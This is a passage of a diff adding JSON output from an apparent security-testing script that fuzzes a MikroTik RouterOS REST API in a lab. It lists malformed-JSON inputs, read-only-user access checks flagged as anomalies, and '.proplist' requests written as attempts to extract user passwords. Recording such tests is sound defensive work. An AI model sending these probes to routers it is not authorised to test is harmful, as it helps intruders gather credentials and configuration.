@@ -1,0 +1,3071 @@
+{
+  "metadata": {
+    "script": "novel_rest_deep.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": 9,
+    "start_time": "2026-02-16T01:20:48.529891",
+    "end_time": "2026-02-16T01:22:50.256997",
+    "total_tests": 202,
+    "anomalies": 18,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "4m54s",
+    "router_log_count": 18,
+    "router_interesting_events": 0,
+    "final_health": {
+      "alive": true,
+      "uptime": "12s",
+      "cpu_load": "0",
+      "free_memory": "843673600",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "json_edge_cases",
+      "name": "JSON edge: deeply_nested_500 on /system/identity/set",
+      "description": "Send crafted JSON (deeply_nested_500) to /system/identity/set",
+      "result": "HTTP 400, resp_len=66",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.553879",
+      "details": {
+        "payload_name": "deeply_nested_500",
+        "endpoint": "/system/identity/set",
+        "status": 400,
+        "response": "{'detail': 'Invalid JSON', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 3017
+      }
+    },
+    {
+      "id": 2,
+      "category": "json_edge_cases",
+      "name": "JSON edge: long_key_64KB on /system/identity/set",
+      "description": "Send crafted JSON (long_key_64KB) to /system/identity/set",
+      "result": "HTTP 400, resp_len=68",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.553879",
+      "details": {
+        "payload_name": "long_key_64KB",
+        "endpoint": "/system/identity/set",
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 65548
+      }
+    },
+    {
+      "id": 3,
+      "category": "json_edge_cases",
+      "name": "JSON edge: mixed_type_array on /system/identity/set",
+      "description": "Send crafted JSON (mixed_type_array) to /system/identity/set",
+      "result": "HTTP 200, resp_len=2",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.561875",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/identity/set",
+        "status": 200,
+        "response": "[]",
+        "payload_size": 59
+      }
+    },
+    {
+      "id": 4,
+      "category": "json_edge_cases",
+      "name": "JSON edge: truncated_utf8 on /system/identity/set",
+      "description": "Send crafted JSON (truncated_utf8) to /system/identity/set",
+      "result": "HTTP 200, resp_len=2",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.561875",
+      "details": {
+        "payload_name": "truncated_utf8",
+        "endpoint": "/system/identity/set",
+        "status": 200,
+        "response": "[]",
+        "payload_size": 16
+      }
+    },
+    {
+      "id": 5,
+      "category": "json_edge_cases",
+      "name": "JSON edge: bom_prefix on /system/identity/set",
+      "description": "Send crafted JSON (bom_prefix) to /system/identity/set",
+      "result": "HTTP 400, resp_len=66",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.561875",
+      "details": {
+        "payload_name": "bom_prefix",
+        "endpoint": "/system/identity/set",
+        "status": 400,
+        "response": "{'detail': 'Invalid JSON', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 22
+      }
+    },
+    {
+      "id": 6,
+      "category": "json_edge_cases",
+      "name": "JSON edge: deeply_nested_500 on /system/script/add",
+      "description": "Send crafted JSON (deeply_nested_500) to /system/script/add",
+      "result": "HTTP 400, resp_len=66",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.561875",
+      "details": {
+        "payload_name": "deeply_nested_500",
+        "endpoint": "/system/script/add",
+        "status": 400,
+        "response": "{'detail': 'Invalid JSON', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 3017
+      }
+    },
+    {
+      "id": 7,
+      "category": "json_edge_cases",
+      "name": "JSON edge: long_key_64KB on /system/script/add",
+      "description": "Send crafted JSON (long_key_64KB) to /system/script/add",
+      "result": "HTTP 400, resp_len=68",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.561875",
+      "details": {
+        "payload_name": "long_key_64KB",
+        "endpoint": "/system/script/add",
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 65548
+      }
+    },
+    {
+      "id": 8,
+      "category": "json_edge_cases",
+      "name": "JSON edge: mixed_type_array on /system/script/add",
+      "description": "Send crafted JSON (mixed_type_array) to /system/script/add",
+      "result": "HTTP 200, resp_len=14",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.585863",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/script/add",
+        "status": 200,
+        "response": "{'ret': '*9A'}",
+        "payload_size": 59
+      }
+    },
+    {
+      "id": 9,
+      "category": "json_edge_cases",
+      "name": "JSON edge: truncated_utf8 on /system/script/add",
+      "description": "Send crafted JSON (truncated_utf8) to /system/script/add",
+      "result": "HTTP 200, resp_len=14",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.589861",
+      "details": {
+        "payload_name": "truncated_utf8",
+        "endpoint": "/system/script/add",
+        "status": 200,
+        "response": "{'ret': '*9B'}",
+        "payload_size": 16
+      }
+    },
+    {
+      "id": 10,
+      "category": "json_edge_cases",
+      "name": "JSON edge: bom_prefix on /system/script/add",
+      "description": "Send crafted JSON (bom_prefix) to /system/script/add",
+      "result": "HTTP 400, resp_len=66",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.593859",
+      "details": {
+        "payload_name": "bom_prefix",
+        "endpoint": "/system/script/add",
+        "status": 400,
+        "response": "{'detail': 'Invalid JSON', 'error': 400, 'message': 'Bad Request'}",
+        "payload_size": 22
+      }
+    },
+    {
+      "id": 11,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /system/resource",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.593859"
+    },
+    {
+      "id": 12,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /system/resource",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 13,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /system/resource",
+      "description": "GET /system/resource with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/resource",
+        "status": 200,
+        "response": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"0\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"73031680\",\"free-memory\":\"841650176\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"935649"
+      }
+    },
+    {
+      "id": 14,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /system/identity",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 15,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /system/identity",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 16,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /system/identity",
+      "description": "GET /system/identity with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/identity",
+        "status": 200,
+        "response": "{\"name\":\"test\ufffd\"}"
+      }
+    },
+    {
+      "id": 17,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /user",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 18,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /user",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 19,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /user",
+      "description": "GET /user with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/user",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"address\":\"\",\"comment\":\"system default user\",\"disabled\":\"false\",\"expired\":\"false\",\"group\":\"full\",\"inactivity-policy\":\"none\",\"inactivity-timeout\":\"10m\",\"last-logged-in\":\"2026-02-23 00:05:26\",\"name\":\"admin\"},{\".id\":\"*2\",\"address\":\"\",\"disabled\":\"false\",\"expired\":\"false\",\"group\":\"full\",\"ina"
+      }
+    },
+    {
+      "id": 20,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /user/group",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 21,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /user/group",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 22,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /user/group",
+      "description": "GET /user/group with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/user/group",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"name\":\"read\",\"policy\":\"local,telnet,ssh,reboot,read,test,winbox,password,web,sniff,sensitive,api,romon,rest-api,!ftp,!write,!policy\",\"skin\":\"default\"},{\".id\":\"*2\",\"name\":\"write\",\"policy\":\"local,telnet,ssh,reboot,read,write,test,winbox,password,web,sniff,sensitive,api,romon,rest-api,!ft"
+      }
+    },
+    {
+      "id": 23,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /file",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 24,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /file",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.597857"
+    },
+    {
+      "id": 25,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /file",
+      "description": "GET /file with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/file",
+        "status": 200,
+        "response": "[{\".id\":\"*/1000FE210466696C65\",\"contents\":\"<!doctype html>\\n<html lang=\\\"en\\\">\\n<meta charset=\\\"utf-8\\\">\\n<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\">\\n<link rel=\\\"icon\\\" href=\\\"/favicon.png\\\">\\n<link rel=\\\"icon\\\" href=\\\"/favicon.svg\\\">\\n<title>RouterOS</title>\\n<link rel"
+      }
+    },
+    {
+      "id": 26,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /system/script",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 27,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /system/script",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 28,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /system/script",
+      "description": "GET /system/script with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/script",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\".nextid\":\"*16\",\"dont-require-permissions\":\"false\",\"invalid\":\"false\",\"name\":\"csrftest\",\"owner\":\"admin\",\"policy\":\"ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon\",\"run-count\":\"0\",\"source\":\":log info csrf\"},{\".id\":\"*16\",\".nextid\":\"*17\",\"dont-require-permissions\":\"false\",\""
+      }
+    },
+    {
+      "id": 29,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /system/scheduler",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 30,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /system/scheduler",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 31,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /system/scheduler",
+      "description": "GET /system/scheduler with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/system/scheduler",
+        "status": 200,
+        "response": "[{\".id\":\"*0\",\"disabled\":\"false\",\"interval\":\"1d\",\"name\":\"csrftest\",\"next-run\":\"2026-02-23 03:10:19\",\"on-event\":\"/log info csrf\",\"owner\":\"admin\",\"policy\":\"ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon\",\"run-count\":\"0\",\"start-date\":\"2026-02-16\",\"start-time\":\"03:10:19\"},{\".id\":\"*1\",\"d"
+      }
+    },
+    {
+      "id": 32,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /tool/fetch",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 33,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /tool/fetch",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 34,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /tool/fetch",
+      "description": "GET /tool/fetch with JSON body (mixed_type_array)",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/tool/fetch",
+        "status": 400,
+        "response": "{\"detail\":\"no such command\",\"error\":400,\"message\":\"Bad Request\"}"
+      }
+    },
+    {
+      "id": 35,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /ip/firewall/filter",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 36,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /ip/firewall/filter",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835"
+    },
+    {
+      "id": 37,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /ip/firewall/filter",
+      "description": "GET /ip/firewall/filter with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.641835",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/ip/firewall/filter",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"action\":\"accept\",\"bytes\":\"1147110\",\"chain\":\"input\",\"comment\":\"csrf-test\",\"dynamic\":\"false\",\"invalid\":\"false\",\"packets\":\"4627\"},{\".id\":\"*2\",\"action\":\"accept\",\"bytes\":\"0\",\"chain\":\"input\",\"comment\":\"csrf-test\",\"dynamic\":\"false\",\"invalid\":\"false\",\"packets\":\"0\"},{\".id\":\"*3\",\"action\":\"accept"
+      }
+    },
+    {
+      "id": 38,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: deeply_nested_500 on /ip/address",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.705803"
+    },
+    {
+      "id": 39,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: long_key_64KB on /ip/address",
+      "description": "GET with JSON body",
+      "result": "Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.713799"
+    },
+    {
+      "id": 40,
+      "category": "json_edge_cases",
+      "name": "GET+JSON: mixed_type_array on /ip/address",
+      "description": "GET /ip/address with JSON body (mixed_type_array)",
+      "result": "HTTP 200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.745783",
+      "details": {
+        "payload_name": "mixed_type_array",
+        "endpoint": "/ip/address",
+        "status": 200,
+        "response": "[{\".id\":\"*2\",\"actual-interface\":\"lo\",\"address\":\"[REDACTED-INTERNAL-IP]/32\",\"disabled\":\"false\",\"dynamic\":\"false\",\"interface\":\"lo\",\"invalid\":\"false\",\"network\":\"[REDACTED-INTERNAL-IP]\",\"slave\":\"false\"},{\".id\":\"*3\",\"actual-interface\":\"ether1\",\"address\":\"[REDACTED-INTERNAL-IP]/24\",\"disabled\":\"false\",\"dynamic\":\"true\",\"interface\":\""
+      }
+    },
+    {
+      "id": 41,
+      "category": "acl_edge",
+      "name": "Read user GET /user",
+      "description": "Test read-only user access to List users",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:20:48.749781",
+      "details": {
+        "path": "/user",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', 'address': '', 'comment': 'system default user', 'disabled': 'false', 'expired': 'false', 'group': 'full', 'inactivity-policy': 'none', 'inactivity-timeout': '10m', 'last-logged-in': '2026-02-23 00:05:26', 'name': 'admin'}, {'.id': '*2', 'address': '', 'disabled': 'false', 'expired': "
+      }
+    },
+    {
+      "id": 42,
+      "category": "acl_edge",
+      "name": "Read user GET /user/group",
+      "description": "Test read-only user access to List user groups",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.753779",
+      "details": {
+        "path": "/user/group",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', 'name': 'read', 'policy': 'local,telnet,ssh,reboot,read,test,winbox,password,web,sniff,sensitive,api,romon,rest-api,!ftp,!write,!policy', 'skin': 'default'}, {'.id': '*2', 'name': 'write', 'policy': 'local,telnet,ssh,reboot,read,write,test,winbox,password,web,sniff,sensitive,api,romon"
+      }
+    },
+    {
+      "id": 43,
+      "category": "acl_edge",
+      "name": "Read user GET /system/script",
+      "description": "Test read-only user access to List scripts",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.797757",
+      "details": {
+        "path": "/system/script",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', '.nextid': '*16', 'dont-require-permissions': 'false', 'invalid': 'false', 'name': 'csrftest', 'owner': 'admin', 'policy': 'ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon', 'run-count': '0', 'source': ':log info csrf'}, {'.id': '*16', '.nextid': '*17', 'dont-require-"
+      }
+    },
+    {
+      "id": 44,
+      "category": "acl_edge",
+      "name": "Read user GET /file",
+      "description": "Test read-only user access to List files",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.857727",
+      "details": {
+        "path": "/file",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*/1000FE210466696C65', 'contents': '<!doctype html>\\n<html lang=\"en\">\\n<meta charset=\"utf-8\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n<link rel=\"icon\" href=\"/favicon.png\">\\n<link rel=\"icon\" href=\"/favicon.svg\">\\n<title>RouterOS</title>\\n<link rel=\"stylesheet\""
+      }
+    },
+    {
+      "id": 45,
+      "category": "acl_edge",
+      "name": "Read user GET /certificate",
+      "description": "Test read-only user access to List certificates",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:20:48.857727",
+      "details": {
+        "path": "/certificate",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', 'akid': '', 'authority': 'true', 'common-name': 'mikrotik-test', 'crl': 'false', 'days-valid': '365', 'digest-algorithm': 'sha256', 'expires-after': '51w1d2h43m50s', 'fingerprint': 'ee09552bc3712458998fafd0e7cd95c3bbb64877bca8cc9efa0d30aa53068e8c', 'invalid-after': '2027-02-16 02:49:1"
+      }
+    },
+    {
+      "id": 46,
+      "category": "acl_edge",
+      "name": "Read user GET /ip/service",
+      "description": "Test read-only user access to IP services",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.877717",
+      "details": {
+        "path": "/ip/service",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', 'address': '', 'disabled': 'false', 'dynamic': 'false', 'invalid': 'false', 'max-sessions': '20', 'name': 'ftp', 'port': '21', 'proto': 'tcp', 'vrf': 'main'}, {'.id': '*4', 'address': '', 'disabled': 'false', 'dynamic': 'false', 'invalid': 'false', 'max-sessions': '20', 'name': 'ssh',"
+      }
+    },
+    {
+      "id": 47,
+      "category": "acl_edge",
+      "name": "Read user GET /ppp/secret",
+      "description": "Test read-only user access to PPP secrets",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:20:48.909701",
+      "details": {
+        "path": "/ppp/secret",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[]"
+      }
+    },
+    {
+      "id": 48,
+      "category": "acl_edge",
+      "name": "Read user GET /system/logging",
+      "description": "Test read-only user access to Logging config",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.913699",
+      "details": {
+        "path": "/system/logging",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*1', 'action': 'memory', 'default': 'true', 'disabled': 'false', 'invalid': 'false', 'prefix': '', 'regex': '', 'topics': 'info'}, {'.id': '*2', 'action': 'memory', 'default': 'true', 'disabled': 'false', 'invalid': 'false', 'prefix': '', 'regex': '', 'topics': 'error'}, {'.id': '*3', 'act"
+      }
+    },
+    {
+      "id": 49,
+      "category": "acl_edge",
+      "name": "Read user GET /snmp/community",
+      "description": "Test read-only user access to SNMP communities",
+      "result": "HTTP 200, accessible=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:48.917697",
+      "details": {
+        "path": "/snmp/community",
+        "status": 200,
+        "accessible": true,
+        "data_preview": "[{'.id': '*0', 'addresses': '::/0', 'authentication-password': '', 'authentication-protocol': 'MD5', 'default': 'true', 'disabled': 'false', 'encryption-password': '', 'encryption-protocol': 'DES', 'name': 'public', 'read-access': 'true', 'security': 'none', 'write-access': 'false'}]"
+      }
+    },
+    {
+      "id": 50,
+      "category": "acl_edge",
+      "name": "Proplist admin: /user?.proplist=password,name",
+      "description": "Attempt to extract passwords via .proplist",
+      "result": "HTTP 200, password_leaked=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.037637",
+      "details": {
+        "path": "/user?.proplist=password,name",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"name\":\"admin\"},{\".id\":\"*2\",\"name\":\"testfull\"},{\".id\":\"*3\",\"name\":\"testread\"},{\".id\":\"*4\",\"name\":\"testwrite\"},{\".id\":\"*5\",\"name\":\"csrftest\"},{\".id\":\"*6\",\"name\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"},{\".id\":\"*7\",\"name\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "password_in_response": false
+      }
+    },
+    {
+      "id": 51,
+      "category": "acl_edge",
+      "name": "Proplist admin: /user?.proplist=*",
+      "description": "Wildcard proplist to show all fields",
+      "result": "HTTP 200, password_leaked=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.097607",
+      "details": {
+        "path": "/user?.proplist=*",
+        "status": 200,
+        "response": "[{\".id\":\"*1\"},{\".id\":\"*2\"},{\".id\":\"*3\"},{\".id\":\"*4\"},{\".id\":\"*5\"},{\".id\":\"*6\"},{\".id\":\"*7\"},{\".id\":\"*8\"},{\".id\":\"*12\"},{\".id\":\"*14\"},{\".id\":\"*15\"},{\".id\":\"*16\"},{\".id\":\"*17\"},{\".id\":\"*19\"},{\".id\":\"*1A\"}]",
+        "password_in_response": false
+      }
+    },
+    {
+      "id": 52,
+      "category": "acl_edge",
+      "name": "Proplist admin: /user?.proplist=name,group,password,comment,last-logged-in",
+      "description": "Proplist with sensitive fields",
+      "result": "HTTP 200, password_leaked=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.293509",
+      "details": {
+        "path": "/user?.proplist=name,group,password,comment,last-logged-in",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"comment\":\"system default user\",\"group\":\"full\",\"last-logged-in\":\"2026-02-23 00:05:26\",\"name\":\"admin\"},{\".id\":\"*2\",\"group\":\"full\",\"last-logged-in\":\"2026-02-20 15:07:21\",\"name\":\"testfull\"},{\".id\":\"*3\",\"group\":\"read\",\"last-logged-in\":\"2026-02-20 15:07:21\",\"name\":\"testread\"},{\".id\":\"*4\",\"group\":\"write\",\"last-logged-in\":\"2026-02-20 15:07:21\",\"name\":\"testwrite\"},{\".id\":\"*5\",\"group\":\"read\",\"name\":\"csrftest\"},{\".id\":\"*6\",\"group\":\"read\",\"name\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "password_in_response": false
+      }
+    },
+    {
+      "id": 53,
+      "category": "acl_edge",
+      "name": "Proplist admin: /ip/service?.proplist=name,port,address,certificate,disabled",
+      "description": "Service config proplist",
+      "result": "HTTP 200, password_leaked=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.297507",
+      "details": {
+        "path": "/ip/service?.proplist=name,port,address,certificate,disabled",
+        "status": 200,
+        "response": "[{\".id\":\"*1\",\"address\":\"\",\"disabled\":\"false\",\"name\":\"ftp\",\"port\":\"21\"},{\".id\":\"*4\",\"address\":\"\",\"disabled\":\"false\",\"name\":\"ssh\",\"port\":\"22\"},{\".id\":\"*0\",\"address\":\"\",\"disabled\":\"false\",\"name\":\"telnet\",\"port\":\"23\"},{\".id\":\"*F\",\"disabled\":\"false\",\"name\":\"dhcpclient\",\"port\":\"68\"},{\".id\":\"*2\",\"address\":\"\",\"disabled\":\"false\",\"name\":\"www\",\"port\":\"80\"},{\".id\":\"*C\",\"disabled\":\"false\",\"name\":\"www\",\"port\":\"80\"},{\".id\":\"*B\",\"disabled\":\"false\",\"name\":\"www\",\"port\":\"80\"},{\".id\":\"*E\",\"disabled\":\"false\",\"name\":",
+        "password_in_response": false
+      }
+    },
+    {
+      "id": 54,
+      "category": "acl_edge",
+      "name": "Proplist admin: /system/identity?.proplist=name",
+      "description": "Identity proplist (baseline)",
+      "result": "HTTP 200, password_leaked=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:20:49.309501",
+      "details": {
+        "path": "/system/identity?.proplist=name",
+        "status": 200,
+        "response": "{\"name\":\"test\ufffd\"}",
+        "password_in_response": false
+      }
+    },
+    {
+      "id": 55,
